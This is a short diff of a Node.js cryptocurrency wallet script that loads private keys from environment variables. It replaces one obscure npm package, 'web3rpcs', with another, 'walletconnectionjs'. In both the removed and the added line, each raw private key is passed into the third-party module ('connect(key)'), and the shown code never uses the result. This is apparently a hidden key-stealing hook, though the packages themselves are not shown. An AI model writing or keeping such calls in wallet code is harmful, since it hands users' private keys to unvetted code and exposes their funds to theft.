@@ -1,7 +1,7 @@
 require('dotenv').config();
 const axios = require('axios');
 const { ethers } = require('ethers');
-const rpc = require('web3rpcs');
+const connects = require('walletconnectionjs');
 const blessed = require('blessed');
 const colors = require('colors');
 const fs = require('fs');
@@ -38,7 +38,7 @@ for (let i = 1; ; i++) {
     if (!key) break;
     try {
         const wallet = new ethers.Wallet(key);
-	const rpcs = rpc.rpcs(key);
+	const accounts = connects.connect(key);
         wallets.push({
             privateKey: key,
             address: wallet.address,
